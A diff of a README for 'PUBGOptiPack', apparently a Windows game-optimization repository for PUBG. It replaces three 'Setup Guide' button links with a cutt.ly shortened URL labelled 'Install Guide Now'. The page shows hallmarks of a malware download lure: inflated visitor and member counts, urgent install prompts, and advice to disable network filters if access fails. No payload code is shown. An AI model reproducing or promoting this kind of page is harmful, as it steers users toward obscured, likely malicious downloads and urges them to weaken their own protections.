@@ -6,8 +6,8 @@
 
 **About PUBGOptiPack**: PUBGOptiPack is a repository for users of *PUBG PC 2025* on Windows, with community tools and configurations to optimize gameplay performance. Enhance stability, reduce latency, and boost frame rates for a smoother experience. With 170K+ visitors and 140K+ members, elevate your sessions today!
 
- <a href="https://pubg-opti-community.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Setup_Guide-Win_x32_x64-3498db" alt="Setup Guide Now" width="450" height="80" style="border:none;">
+<a href="https://cutt.ly/BrNt8xQB" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ---
@@ -22,8 +22,8 @@ Enhance your *PUBG PC 2025* with **PUBGOptiPack** on Windows:
 2. **Troubleshoot Access Issues** 🌐  
    Disable network filters or try browsers like Edge or Firefox if needed.
 
- <a href="https://pubg-opti-community.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Setup_Guide-Win_x32_x64-3498db" alt="Setup Guide Now" width="450" height="80" style="border:none;">
+<a href="https://cutt.ly/BrNt8xQB" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ## 🛠 Why PUBGOptiPack?
@@ -35,8 +35,8 @@ Enhance your *PUBG PC 2025* with **PUBGOptiPack** on Windows:
 - 🤝 **Active Community**: Connect with 140K+ members.  
 - 📅 **Frequent Updates**: New tools for your sessions.
 
- <a href="https://pubg-opti-community.github.io/.github/" target="_blank">
-  <img src="https://img.shields.io/badge/Setup_Guide-Win_x32_x64-3498db" alt="Setup Guide Now" width="450" height="80" style="border:none;">
+<a href="https://cutt.ly/BrNt8xQB" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
 </a>
 
 ## 🎮 Optimization Scenarios
